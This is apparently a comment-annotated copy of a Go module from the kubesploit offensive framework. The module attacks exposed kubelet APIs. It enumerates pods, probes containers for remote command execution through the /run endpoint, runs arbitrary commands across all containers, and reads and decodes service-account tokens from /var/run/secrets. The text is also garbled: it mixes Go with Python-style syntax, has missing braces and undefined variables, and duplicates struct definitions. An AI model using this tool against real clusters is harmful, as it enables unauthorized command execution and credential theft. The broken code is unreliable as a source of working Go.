# `kubesploit\data\modules\sourcecode\go\kubelet\main.go`

```
// 定义结构体 MetaData，包含字段 Name，用于存储 JSON 数据
type MetaData struct {
    Name      string `json:"name"`  // JSON 数据中的 name 字段
// 定义一个字符串类型的字段，用于存储命名空间信息，并指定在 JSON 中的字段名为"namespace"
Namespace string `json:"namespace"`

// 定义一个容器结构体，包含名称和两个布尔类型的字段，分别表示是否允许远程命令执行和是否正在运行远程命令
type Container struct {
	Name    string `json:"name"`  // 容器名称，指定在 JSON 中的字段名为"name"
	RCEExec bool   // 是否允许远程命令执行
	RCERun  bool   // 是否正在运行远程命令
}

// 定义一个规格结构体，包含一个容器数组字段，用于存储多个容器的信息
type Spec struct {
	Containers []Container `json:"containers"`  // 容器数组，指定在 JSON 中的字段名为"containers"
}

// 定义一个 Pod 结构体，包含元数据和规格两个字段
type Pod struct {
	MetaData MetaData `json:"metadata"`  // 元数据，指定在 JSON 中的字段名为"metadata"
	Spec     Spec     `json:"spec"`      // 规格信息，指定在 JSON 中的字段名为"spec"
}

// 定义一个 PodList 结构体，包含一个 Pod 数组字段，用于存储多个 Pod 的信息
type PodList struct {
	Items []Pod `json:"items"`  // Pod 数组，指定在 JSON 中的字段名为"items"
# 定义全局变量 GlobalClient，用于发送 HTTP 请求
var GlobalClient *http.Client

# 初始化 HTTP 客户端，设置连接池最大空闲连接数、空闲连接超时时间、禁用压缩、跳过证书验证等参数
func InitHttpClient() {
    tr := &http.Transport{
        MaxIdleConns:       10,                    # 设置最大空闲连接数
        IdleConnTimeout:    30 * time.Second,      # 设置空闲连接超时时间
        DisableCompression: true,                  # 禁用压缩
        TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},  # 跳过证书验证
    }

    # 创建全局的 HTTP 客户端对象，设置传输层和超时时间
    GlobalClient = &http.Client{
        Transport: tr,                            # 设置传输层
        Timeout:   time.Second * 20,              # 设置超时时间
    }
}

# 发送 HTTP 请求获取 Pod 列表
func getPods(url string) PodList {
// 拼接 API 地址
apiUrl := url + PODS_API
// 发起 GET 请求，获取响应
resp, err := GetRequest(GlobalClient, apiUrl)
// 如果发生错误，打印错误信息并退出程序
if err != nil {
    fmt.Printf("[*] Failed to run HTTP request with error: %s\n", err)
    os.Exit(1)
}

// 读取响应体的内容
bodyBytes, err := ioutil.ReadAll(resp.Body)
// 如果发生错误，记录错误并退出程序
if err != nil {
    log.Fatal(err)
}

// 解析 JSON 格式的响应体内容到 PodList 结构体
var podList PodList
err = json.Unmarshal(bodyBytes, &podList)

// 返回解析后的 PodList 结构体
return podList
}

// 根据 URL 获取原始的 Pod 数据
func getRawPods(url string) []byte {
// 拼接 API 地址
apiUrl := url + PODS_API
// 发送 HTTP GET 请求获取响应
resp, err := GetRequest(GlobalClient, apiUrl)
// 如果发生错误，打印错误信息并退出程序
if err != nil {
    fmt.Printf("[*] Failed to run HTTP request with error: %s\n", err)
    os.Exit(1)
}

// 读取响应体的内容
bodyBytes, err := ioutil.ReadAll(resp.Body)
// 如果发生错误，记录错误并终止程序
if err != nil {
    log.Fatal(err)
}

// 返回响应体的内容
return bodyBytes
}

// 定义常量
const (
    PODS_API string = "/pods"
    RUN_API  string = "/run"
    EXEC_API string = "/exec"
)
// 根据给定的客户端和 URL 创建一个 GET 请求，并返回响应和可能的错误
func GetRequest(client *http.Client, url string) (*http.Response, error) {
    // 创建一个 GET 请求
    req, _ := http.NewRequest("GET", url, nil)
    
    // 发送请求并获取响应
    resp, err := (*client).Do(req)
    return resp, err
}

// 根据给定的客户端、URL 和请求体数据创建一个 POST 请求，并返回响应和可能的错误
func PostRequest(client *http.Client, url string, bodyData []byte) (*http.Response, error) {
    // 创建一个 POST 请求
    req, _ := http.NewRequest("POST", url, bytes.NewBuffer(bodyData))
    
    // 设置请求头
    req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
    
    // 发送请求并获取响应
    resp, err := (*client).Do(req)
    return resp, err
}

// 打印 Pod 列表
func printPods(podList []Pod) {
    // 初始化计数器
    count := 1
// 设置基础小写字母的 ASCII 码值为 97
baseSubIndexAlpha := 97 // base 'a'
// 遍历 podList 中的每个 pod
for _, pod := range podList {
    // 打印 Pod 的名称和命名空间
    fmt.Printf("%d. Pod: %s \n   Namespace: %s\n   Containers:\n", count, pod.MetaData.Name, pod.MetaData.Namespace)
    count += 1
    count2 := 0
    containers := pod.Spec.Containers
    // 遍历当前 pod 的每个容器
    for _, container := range containers {
        // 如果容器的 RCE 运行标志为真，则打印带有 RCE 启用信息的容器名称
        if container.RCERun {
            fmt.Printf("      %s. Container: %s (\u001B[1;34mRCE enabled\u001B[0m)\n", string(count2+baseSubIndexAlpha), container.Name)
        } else {
            // 否则，打印容器名称
            fmt.Printf("      %s. Container: %s\n", string(count2+baseSubIndexAlpha), container.Name)
        }
        count2 += 1
    }
}
// 检查 Pods 是否存在远程命令执行漏洞
func checkPodsForRCE(nodeUrl string, pods []Pod) []Pod {
    // 定义远程命令
    command := "cmd=ls /"
    // 存储存在漏洞的 Pods
    var nodePods []Pod

    // 遍历 Pods
    for _, pod := range pods {
        // 存储容器信息
        var podContainers []Container
        // 获取 Pod 中的容器列表
        containers := pod.Spec.Containers
        // 遍历容器列表
        for _, container := range containers {
            // 标记容器是否存在远程命令执行漏洞
            containerRCERun := false
            // 构建 API 路径
            apiPathUrl := fmt.Sprintf("%s%s/%s/%s/%s", nodeUrl, RUN_API, pod.MetaData.Namespace, pod.MetaData.Name, container.Name)
            // 发送 POST 请求，执行远程命令
            resp, err := PostRequest(GlobalClient, apiPathUrl, []byte(command))

            // TODO: 检查这个检查是否足够
            // 检查是否请求成功，并且返回状态码为 200
            if err == nil && resp != nil && resp.StatusCode == http.StatusOK {
                // 标记容器存在远程命令执行漏洞
                containerRCERun = true
            }
# 将容器信息添加到podContainers切片中
podContainers = append(podContainers, Container {
    Name:    container.Name,  # 设置容器名称
    RCERun:  containerRCERun,  # 设置容器的RCERun属性
})

# 将pod信息添加到nodePods切片中
nodePods = append(nodePods, Pod{
    MetaData:       MetaData{  # 设置pod的元数据
        Name:      pod.MetaData.Name,  # 设置pod的名称
        Namespace: pod.MetaData.Namespace,  # 设置pod的命名空间
    },
    Spec: Spec{  # 设置pod的规格
        Containers: podContainers,  # 设置pod的容器信息
    },
})

# 返回nodePods切片作为结果
return nodePods
// 声明全局变量 globalProtocolSchema 用于存储协议模式
var globalProtocolSchema string
// 声明全局变量 globalNodeIP 用于存储节点 IP 地址
var globalNodeIP string
// 声明全局变量 globalKubeletPort 用于存储 Kubelet 端口号
var globalKubeletPort string

// 解析节点 URL，将协议模式、节点 IP 地址和 Kubelet 端口号存储到全局变量中
func parseNodeURl(url string){
    // 使用冒号分割 URL 字符串
    splitted := strings.Split(url, ":")
    // 将协议模式存储到全局变量中
    globalProtocolSchema = splitted[0]
    // 从节点 IP 地址中移除斜杠后存储到全局变量中
    globalNodeIP = strings.Replace(splitted[1], "/", "", 2)
    // 将 Kubelet 端口号存储到全局变量中
    globalKubeletPort = splitted[2]
}

// 查找并打印具有 RCE（远程命令执行）漏洞的容器
func findAndPrintContainerWithRCE(url string){
    // 获取指定 URL 下的 Pod 列表
    podList := getPods(url)
    // 检查 Pod 列表中的容器是否存在 RCE 漏洞
    containersWithRCE := checkPodsForRCE(url, podList.Items)
    // 打印具有 RCE 漏洞的容器
    printPods(containersWithRCE)
}

// 查找并打印 Pod 列表
func findAndPrintPods(url string){
    // 获取指定 URL 下的 Pod 列表
    podList := getPods(url)
    // 打印 Pod 列表
    printPods(podList.Items)
}
// credit: https://stackoverflow.com/a/46973603
// 解析命令行参数
func parseCommandLine(command string) ([]string, error) {
    // 初始化参数列表和状态
	var args []string
	state := "start"
	current := ""
	quote := "\""
	escapeNext := true
    // 遍历命令字符串
	for i := 0; i < len(command); i++ {
		c := command[i]

        // 处理引号状态
		if state == "quotes" {
			if string(c) != quote {
				current += string(c)
			} else {
				args = append(args, current)
				current = ""
				state = "start"
			}
		// 如果遇到分号，直接跳过，继续下一次循环
		continue
	}

	if (escapeNext) {
		// 如果需要转义下一个字符，则将当前字符加入到当前字符串中，并将转义标志设为false，继续下一次循环
		current += string(c)
		escapeNext = false
		continue
	}

	if (c == '\\') {
		// 如果遇到反斜杠，则将转义标志设为true，继续下一次循环
		escapeNext = true
		continue
	}

	if c == '"' || c == '\'' {
		// 如果遇到双引号或单引号，则将状态设为引号状态，将引号字符加入到引号变量中，继续下一次循环
		state = "quotes"
		quote = string(c)
		continue
	}
# 如果状态为"arg"，则判断当前字符是否为空格或制表符，如果是则将当前参数添加到参数列表中，并重置当前参数为空字符串，状态变为"start"
# 如果不是空格或制表符，则将当前字符添加到当前参数中
# 继续下一个字符的处理

# 如果当前字符不是空格或制表符，则将状态设置为"arg"，并将当前字符添加到当前参数中

# 如果状态为"quotes"，表示存在未闭合的引号，返回空列表和包含错误信息的错误对象
# 如果当前字符串不为空，则将其添加到参数列表中
if current != "":
    args = append(args, current)

# 返回参数列表和空错误
return args, nil
```

```
# 定义常量
const (
    GET_PODS = "pods"
    GET_CONTAINERS_RCE = "rce"
    RUN_COMMAND = "run"
    TOKEN_COMMAND = "token"
)

# 打印 HTTP 响应
def printHttpResponse(resp *http.Response, err error):
    # 如果响应不为空
    if resp != nil:
        # 读取响应体的字节流
        bodyBytes, err := ioutil.ReadAll(resp.Body)
        # 如果出现错误
        if err != nil:
# 如果发生错误，记录错误并终止程序
log.Fatal(err)

# 将响应体的字节转换为字符串
bodyString := string(bodyBytes)

# 如果响应状态码为 200，打印响应体内容
if resp.StatusCode == http.StatusOK:
    fmt.Println(bodyString)
# 否则，打印响应失败的状态码和消息
else:
    fmt.Printf("[*] The reponse failed with status: %d\n", resp.StatusCode)
    fmt.Printf("[*] Message: %s\n", bodyString)

# 如果响应为空，打印响应为空的消息，并记录错误
else:
    fmt.Println("[*] Response is empty")
    if err != nil:
        log.Fatal(err)
// 在容器上运行命令
func runCommandOnContainer(url string, runCommand string, podName string, containerName string, namespace string) {
    // 如果未设置运行命令，则设置默认命令'ls /'
    if runCommand == "" {
        fmt.Println("[*] No command was set, setting default command 'ls /'")
        runCommand = "ls /"
    }
    // 将命令格式化为'cmd=命令'
    command := "cmd=" + runCommand

    // 构建 API 路径
    apiPathUrl := fmt.Sprintf("%s%s/%s/%s/%s", url, RUN_API, namespace, podName, containerName)
    // 发送 POST 请求并获取响应
    resp, err := PostRequest(GlobalClient, apiPathUrl, []byte(command))

    // 打印 HTTP 响应
    printHttpResponse(resp, err)
}

// 考虑将其设置为异步执行
func runCommandOnAllContainers(url string, runCommand string){
    // 如果未设置运行命令，则设置默认命令'ls /'
    if runCommand == "" {
        fmt.Println("[*] No command was set, setting default command 'ls /'")
        runCommand = "ls /"
    }
    // 将命令格式化为'cmd=命令'
    command := "cmd=" + runCommand
}
	# 从给定的 URL 获取 Pod 列表
	podList := getPods(url)
	# 初始化 Pod 编号为 0
	podNumber := 0
	# 初始化空格字符串
	spacesString := "   "
	# 遍历 Pod 列表
	for _, pod := range podList.Items {
		# 增加 Pod 编号
		podNumber += 1

		# 遍历 Pod 中的容器
		for _, container := range pod.Spec.Containers {
			# 如果 Pod 编号大于 9，则需要添加更多空格以保持行的对齐
			if podNumber > 9 {
				spacesString = "    "
			# 如果 Pod 编号大于 99，则需要添加更多空格以保持行的对齐
			} else if podNumber > 99 {
				spacesString = "     "
			}

			# 构建 API 路径 URL
			apiPathUrl := fmt.Sprintf("%s%s/%s/%s/%s", url, RUN_API,pod.MetaData.Namespace, pod.MetaData.Name, container.Name)
			# 发送 POST 请求
			resp, err := PostRequest(GlobalClient, apiPathUrl, []byte(command))
			var output string
			# 如果没有错误并且响应不为空
			if err == nil && resp != nil {
				# 读取响应体
				bodyBytes, err := ioutil.ReadAll(resp.Body)
// 如果没有错误发生，将响应体转换为字符串赋值给output变量
if err == nil {
    output = string(bodyBytes)
}

// 创建一个字符串构建器，用于构建输出信息
var sb strings.Builder
sb.WriteString(fmt.Sprintf("%d. Pod: %s\n", podNumber, pod.MetaData.Name)) // 将Pod的序号和名称添加到字符串构建器中
sb.WriteString(fmt.Sprintf("%sNamespace: %s\n", spacesString, pod.MetaData.Namespace)) // 将命名空间添加到字符串构建器中
sb.WriteString(fmt.Sprintf("%sContainer: %s\n", spacesString, container.Name)) // 将容器名称添加到字符串构建器中
sb.WriteString(fmt.Sprintf("%sUrl: %s\n", spacesString, apiPathUrl)) // 将URL添加到字符串构建器中
sb.WriteString(fmt.Sprintf("%sOutput: \n%s\n\n", spacesString, output)) // 将输出内容添加到字符串构建器中
fmt.Println(sb.String()) // 打印字符串构建器中的内容

// 结束for循环后的括号
}

// 定义RunOutput结构体，包含Url、PodName和ContainerName字段
type RunOutput struct {
    Url           string
    PodName       string
    ContainerName string
}
// 定义一个结构体，包含 Namespace、Output 和 StatusCode 三个字段，用于存储命令执行的结果
type RunOutput struct {
    Namespace     string
    Output        string
    StatusCode    int
}

// 在多个 Pod 上并行执行命令
func runParallelCommandsOnPods(url string, runCommand string) {
    // 如果未设置要执行的命令，则使用默认命令 'ls /'
    if runCommand == "" {
        fmt.Println("[*] No command was set, setting default command 'ls /'")
        runCommand = "ls /"
    }
    // 将命令格式化为 'cmd=要执行的命令'
    command := "cmd=" + runCommand

    // 获取 Pod 列表
    podList := getPods(url)
    // 设置并发限制为 5
    concurrencyLimit := 5
    // 创建一个带缓冲的通道，用于限制并发数量
    semaphoreChan := make(chan struct{}, concurrencyLimit)

    // 创建一个不带缓冲的通道，用于收集 HTTP 请求的结果
    resultsChan := make(chan *RunOutput)
	// 确保在使用完这些通道后关闭它们
	defer func() {
		close(semaphoreChan)
		close(resultsChan)
	}()

	containersCounter := 0
	// 保持索引并循环遍历我们将发送请求的每个 URL
	for i, pod := range podList.Items {
		for _, container := range pod.Spec.Containers {

			// 使用索引和 URL 启动一个 Go 协程
			go func(i int, pod Pod, container Container) {

				// 这将向 semaphoreChan 发送一个空结构体，基本上是在说将限制加一，但当达到限制时阻塞，直到有空间
				semaphoreChan <- struct{}{}

				apiPathUrl := fmt.Sprintf("%s%s/%s/%s/%s", url, RUN_API, pod.MetaData.Namespace, pod.MetaData.Name, container.Name)
// 发送 POST 请求，获取响应和可能的错误
resp, err := PostRequest(GlobalClient, apiPathUrl, []byte(command)
// 初始化状态码和输出字符串
statusCode := 0
var output string
// 如果没有错误并且有响应
if err == nil && resp != nil {
    // 获取响应状态码
    statusCode = resp.StatusCode
    // 读取响应体内容
    bodyBytes, err := ioutil.ReadAll(resp.Body)
    // 如果没有错误，将响应体内容转换为字符串
    if err == nil {
        output = string(bodyBytes)
    }
}

// 创建 RunOutput 结构体
result := &RunOutput{apiPathUrl, pod.MetaData.Name, container.Name, pod.MetaData.Namespace,output, statusCode}
// 增加容器计数器
containersCounter += 1
// 将结果发送到 resultsChan
resultsChan <- result
// 从 semaphoreChan 中读取，释放一个信号量，允许另一个 goroutine 开始
<-semaphoreChan
		}(i, pod, container)
		}
	}

	// start listening for any results over the resultsChan
	// once we get a Result append it to the Result slice
	// 开始监听结果通道上的任何结果
	// 一旦我们获得一个结果，就将其附加到结果切片中
	podNumber := 1
	spacesString := "   "
	for {
		result := <-resultsChan

		// If we have more than 1 digit, we need to add more spaces to straight the lines
		// 如果我们有多于1位数字，我们需要添加更多的空格来使行变直
		if podNumber > 9 {
			spacesString = "    "
		} else if podNumber > 99 {
			spacesString = "     "
		}

		var sb strings.Builder
		sb.WriteString(fmt.Sprintf("%d. Pod: %s\n", podNumber, result.PodName))
		// 创建一个字符串构建器，将格式化的字符串添加到其中
		// 将 result.Namespace 添加到 sb 中，并在前面加上空格
		sb.WriteString(fmt.Sprintf("%sNamespace: %s\n", spacesString, result.Namespace))
		// 将 result.ContainerName 添加到 sb 中，并在前面加上空格
		sb.WriteString(fmt.Sprintf("%sContainer: %s\n", spacesString, result.ContainerName))
		// 将 result.Url 添加到 sb 中，并在前面加上空格
		sb.WriteString(fmt.Sprintf("%sUrl: %s\n", spacesString, result.Url))
		// 将 result.Output 添加到 sb 中，并在前面加上空格
		sb.WriteString(fmt.Sprintf("%sOutput: \n%s\n\n", spacesString, result.Output))
		// 打印 sb 的内容
		fmt.Println(sb.String())

		// 增加 podNumber 计数
		podNumber += 1

		// 如果 podNumber 等于 containersCounter，则跳出循环
		if podNumber == containersCounter {
			break
		}
	}
}

// 从所有的 Pod 中扫描令牌
func scanForTokensFromAllPods(url string) {
	// 定义要执行的命令
	command := "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"
	// 获取所有的 Pod 列表
	podList := getPods(url)
	// 设置并发限制为5
	concurrencyLimit := 5

	// 创建一个带缓冲的通道，当达到并发限制时会阻塞
	semaphoreChan := make(chan struct{}, concurrencyLimit)

	// 创建一个通道，用于收集 HTTP 请求的结果
	resultsChan := make(chan *RunOutput)

	// 确保在使用完后关闭这些通道
	defer func() {
		close(semaphoreChan)
		close(resultsChan)
	}()

	// 初始化容器计数器
	containersCounter := 0

	// 遍历每个 URL 发送请求
	for i, pod := range podList.Items {
		for _, container := range pod.Spec.Containers {

			// 在闭包中使用索引和 URL 启动一个 Go 协程
// 使用匿名函数并发执行，传入参数 i、pod、container
go func(i int, pod Pod, container Container) {

    // 向信号量通道发送一个空结构体，表示向限制添加一个，但当达到限制时阻塞，直到有空间
    semaphoreChan <- struct{}{}

    // 根据 URL、运行 API、命名空间、Pod 名称、容器名称拼接 API 路径
    apiPathUrl := fmt.Sprintf("%s%s/%s/%s/%s", url, RUN_API, pod.MetaData.Namespace, pod.MetaData.Name, container.Name)
    
    // 发送 POST 请求，将命令转换为字节数组
    resp, err := PostRequest(GlobalClient, apiPathUrl, []byte(command))
    statusCode := 0
    var output string
    if err == nil && resp != nil {
        // 获取响应状态码
        statusCode = resp.StatusCode
        // 读取响应体的字节数组
        bodyBytes, err := ioutil.ReadAll(resp.Body)
        if err == nil {
            // 将字节数组转换为字符串
            output = string(bodyBytes)
        }
    }

    // 创建 RunOutput 结构体，包含 API 路径、Pod 名称、容器名称、命名空间、输出、状态码
    result := &RunOutput{apiPathUrl, pod.MetaData.Name, container.Name, pod.MetaData.Namespace,output, statusCode}
# 增加容器计数器
containersCounter += 1
# 现在我们可以通过resultsChan发送Result结构体
resultsChan <- result
# 一旦完成，我们从semaphoreChan中读取，这会从限制中减去一个，并允许另一个goroutine开始
<-semaphoreChan
# 启动goroutine来处理每个pod和container的信息
}(i, pod, container)
# 开始监听resultsChan上的任何结果
# 一旦获得一个Result，将其追加到Result切片中
var count int
podNumber := 1
spacesString := "   "
for {
    result := <-resultsChan
    count += 1
		// 暂停程序执行500毫秒
		time.Sleep(time.Millisecond * 500)
		// 如果count大于9，需要添加更多空格来使行变直
		if count > 9 {
			spacesString = "    "
		} else if count > 99 {
			spacesString = "     "
		}

		// 创建一个字符串构建器
		var sb strings.Builder
		// 将格式化的字符串添加到字符串构建器中
		sb.WriteString(fmt.Sprintf("%d. Pod: %s\n", podNumber, result.PodName))
		sb.WriteString(fmt.Sprintf("%sNamespace: %s\n", spacesString, result.Namespace))
		sb.WriteString(fmt.Sprintf("%sContainer: %s\n", spacesString, result.ContainerName))
		sb.WriteString(fmt.Sprintf("%sUrl: %s\n", spacesString, result.Url))
		sb.WriteString(fmt.Sprintf("%sOutput: \n%s\n\n", spacesString, result.Output))
		// 打印字符串构建器中的内容
		fmt.Println(sb.String())

		// 如果结果的状态码为http.StatusOK，调用PrintDecodedToken函数
		if result.StatusCode == http.StatusOK {
			PrintDecodedToken(result.Output)
		}
		// 增加 podNumber 变量的值
		podNumber += 1

		// 如果已经达到预期的 runPodsInfo 的数量，则停止循环
		if (podNumber - 1) == containersCounter {
			break
		}
	}

	// 休眠一秒钟
	time.Sleep(time.Second)
}

// 定义 JWTToken 结构体，包含各个字段的标签和类型
type JWTToken struct{
	Iss            string `json:"iss"`
	Namespace      string `json:"kubernetes.io/serviceaccount/namespace"`
	Secret         string `json:"kubernetes.io/serviceaccount/secret.name"`
	ServiceAccount string `json:"kubernetes.io/serviceaccount/service-account.name"`
	Uid            string `json:"kubernetes.io/serviceaccount/service-account.uid"`
	Sub            string `json:"sub"`
}
// 从给定的 tokenString 中解析出 JWT token，并打印出其中的信息
func PrintDecodedToken(tokenString string) {
    // 将 tokenString 按照 "." 分割，取第二部分进行 base64 解码
    splittedToken := strings.Split(tokenString, ".")
    sDec, _  := b64.StdEncoding.DecodeString(splittedToken[1])
    newDec:= string(sDec)
    // 将解码后的字符串中的 "\r\n" 替换为 "\n"
    newDec = strings.Replace(newDec, "\r\n", "\n", -1)
    // 如果解码后的字符串不以 "}" 结尾，则添加 "}"
    if !strings.HasSuffix(newDec, "}"){
        newDec += "}"
    }

    // 将解码后的字符串转换为 JWTToken 结构体
    var jwtToken JWTToken
    err := json.Unmarshal([]byte(newDec), &jwtToken)
    if err != nil {
        fmt.Printf("[*] Failed to print %s", err)
    } else {
        // 创建一个字符串构建器，用于构建打印信息
        var sb strings.Builder
        sb.WriteString(fmt.Sprintln("---------------"))
        sb.WriteString(fmt.Sprintln("|Decoded Token|"))
        sb.WriteString(fmt.Sprintln("---------------"))
        sb.WriteString(fmt.Sprintf(" iss: %s\n", jwtToken.Iss))
	// 将jwtToken的Namespace字段格式化为字符串并添加到sb中
	sb.WriteString(fmt.Sprintf(" Namespace: %s\n", jwtToken.Namespace))
	// 将jwtToken的Secret字段格式化为字符串并添加到sb中
	sb.WriteString(fmt.Sprintf(" Secret name: %s\n", jwtToken.Secret))
	// 将jwtToken的ServiceAccount字段格式化为字符串并添加到sb中
	sb.WriteString(fmt.Sprintf(" ServiceAccount: %s\n", jwtToken.ServiceAccount))
	// 将jwtToken的Uid字段格式化为字符串并添加到sb中
	sb.WriteString(fmt.Sprintf(" uid: %s\n", jwtToken.Uid))
	// 将jwtToken的Sub字段格式化为字符串并添加到sb中
	sb.WriteString(fmt.Sprintf(" sub: %s\n", jwtToken.Sub))
	// 将newDec格式化为字符串并添加到sb中
	sb.WriteString(fmt.Sprintf(" Raw: \n%s\n\n", newDec))
	// 打印sb的内容
	fmt.Println(sb.String())
}

func mainfunc(url string, commandLine string) error {
	//func mainfunc(command string, ){
	//command := "rce"

	// 去除commandLine和url两端的空格
	commandLine = strings.TrimSpace(commandLine)
	url = strings.TrimSpace(url)
	// 解析commandLine并返回args和err
	args, err := parseCommandLine(commandLine)

	// 如果解析出错，返回err
	if err != nil {
		return err
	}

	containerFlag := false  // 初始化容器标志为假
	podFlag := false  // 初始化Pod标志为假
	namespaceFlag := false  // 初始化命名空间标志为假
	waitForRunCommand := false  // 初始化等待运行命令标志为假
	allPodsFlag := false  // 初始化所有Pod标志为假
	allPodsAsyncFlag := false  // 初始化所有异步Pod标志为假
	rawFlag := false  // 初始化原始标志为假
	var containerName string  // 定义容器名称变量
	var podName string  // 定义Pod名称变量
	var namespace string  // 定义命名空间变量
	var command string  // 定义命令变量
	var runCommand string  // 定义运行命令变量

	for i:= 0; i < len(args); i++ {  // 遍历参数列表
		if strings.HasPrefix(args[i], "-c") {  // 如果参数以“-c”开头
			containerFlag = true  // 设置容器标志为真
			continue  // 继续下一次循环
		} else if strings.HasPrefix(args[i], "-p") {  // 如果参数以“-p”开头
# 如果参数以"-c"开头，则设置容器标志为true，并继续下一次循环
podFlag = true
continue
# 如果参数以"-n"开头，则设置命名空间标志为true，并继续下一次循环
namespaceFlag = true
continue
# 如果参数以"-a"开头，则设置所有Pod标志为true，并继续下一次循环
allPodsFlag = true
continue
# 如果参数以"-as"开头，则设置所有Pod异步标志为true，并继续下一次循环
allPodsAsyncFlag = true
continue
# 如果参数以"-r"开头，则设置原始标志为true，并继续下一次循环
rawFlag = true
continue
# 如果参数不以以上任何标志开头，则根据containerFlag和podFlag的状态进行相应的赋值操作
if containerFlag:
    containerName = args[i]
    containerFlag = false
elif podFlag:
    podName = args[i]
# 初始化 podFlag 为 false
podFlag = false
# 如果 namespaceFlag 为 true，则将命令行参数赋值给 namespace，并将 namespaceFlag 置为 false
else if namespaceFlag {
    namespace = args[i]
    namespaceFlag = false
}  
# 如果没有使用任何开关，则根据情况将命令行参数赋值给 runCommand 或 command
else { // without switches
    # 如果 waitForRunCommand 为 true，则将命令行参数赋值给 runCommand，并将 waitForRunCommand 置为 false
    if waitForRunCommand {
        runCommand = args[i]
        waitForRunCommand = false
    } else {
        # 否则将命令行参数赋值给 command，并检查是否为 RUN_COMMAND，如果是则将 waitForRunCommand 置为 true
        command = args[i]
        if command == RUN_COMMAND {
            waitForRunCommand = true
        }
    }
}

# 初始化 HTTP 客户端
InitHttpClient()
// 解析节点的 URL
command = strings.ToLower(command)  // 将命令转换为小写
switch command {  // 根据命令类型进行不同的处理
case GET_CONTAINERS_RCE:  // 如果是获取包含 RCE 的容器命令
    findAndPrintContainerWithRCE(url)  // 查找并打印包含 RCE 的容器
case RUN_COMMAND:  // 如果是运行命令的命令
    if namespace == "" {  // 如果命名空间为空
        namespace = "default"  // 设置命名空间为默认值
    }

    if allPodsFlag {  // 如果是运行在所有 pod 上的命令
        fmt.Printf("[*] Run the command \"%s\" on all pods synchronously\n", runCommand)  // 打印运行命令在所有 pod 上的提示信息
        runCommandOnAllContainers(url, runCommand)  // 在所有容器上同步运行命令
    } else if allPodsAsyncFlag {  // 如果是异步运行在所有 pod 上的命令
        fmt.Printf("[*] Run the command \"%s\" on all pods asynchronously\n", runCommand)  // 打印运行命令在所有 pod 上的提示信息
        runParallelCommandsOnPods(url, runCommand)  // 在所有容器上异步运行命令
    } else {  // 否则
        fmt.Printf("[*] Run the command \"%s\" on pod: %s, container: %s, namespace: %s\n", runCommand)  // 打印在特定 pod 上运行命令的提示信息
        runCommandOnContainer(url, runCommand, podName, containerName, namespace)  // 在特定容器上运行命令
    }
// 根据不同的命令类型执行不同的操作
switch tokenType {
    case TOKEN_COMMAND:
        // 如果是命令类型的token，则从所有pod中扫描token
        scanForTokensFromAllPods(url)
    default:
        if rawFlag {
            // 如果不是命令类型的token且rawFlag为true，则获取原始的pod数据并打印
            raw := getRawPods(url)
            fmt.Println(string(raw))
        } else {
            // 如果不是命令类型的token且rawFlag为false，则查找并打印pod
            findAndPrintPods(url)
        }
    }
    // 返回错误
    return err
}

/*
func main(){
    // 调用mainfunc函数并传入不同的参数
    //mainfunc("run \"whoami\" -n default -c alpine -p alpine")
    mainfunc("https://<node_ip>:10250", "run -a")
    //mainfunc("run -as")
    //mainfunc("https://<node_ip>:10250", "token")
```
// 调用 mainfunc 函数并传入参数 "rce"
// 调用 mainfunc 函数并传入参数 "https://<node_ip>:10250", " pods"
// 注释掉的代码段，不会被执行
```